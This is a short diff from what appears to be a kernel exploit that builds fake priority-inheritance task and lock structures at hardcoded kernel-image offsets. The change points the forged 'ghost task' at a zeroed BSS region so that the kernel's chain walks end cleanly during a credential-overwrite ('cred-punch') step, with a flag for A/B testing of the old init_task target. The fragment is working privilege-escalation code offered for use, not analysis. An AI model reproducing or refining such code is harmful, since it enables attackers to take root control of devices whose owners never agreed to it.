@@ -973,7 +973,24 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
-              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              /* 09-12 GhostLockAdapt: init_task as ghost task makes every
+               * system PI walk descend init's chain and stall on the
+               * malformed node (their explicit finding; our cred-punch
+               * walk KPs match). Dead-end BSS: reads as null task
+               * (pi_blocked_on=0) → walks TERMINATE. bss_tail+0x1000 is
+               * the proven zeroed mapped region. MODE4_CRED_INITTASK=1
+               * restores the old behavior for A/B. */
+              {
+                uint64_t bt_off =
+                    (active_offsets && active_offsets->off_bss_tail_lock)
+                        ? (uint64_t)active_offsets->off_bss_tail_lock
+                        : 0x02BB9D00ULL;
+                uint64_t dead_off =
+                    env_flag("MODE4_CRED_INITTASK", 0)
+                        ? it_off
+                        : bt_off + 0x1000;
+                stack_task = data_addr(KIMAGE_TEXT_BASE + dead_off);
+              }
               stack_lock = data_addr(KIMAGE_TEXT_BASE +
                   (active_offsets && active_offsets->off_bss_tail_lock
                        ? (uint64_t)active_offsets->off_bss_tail_lock
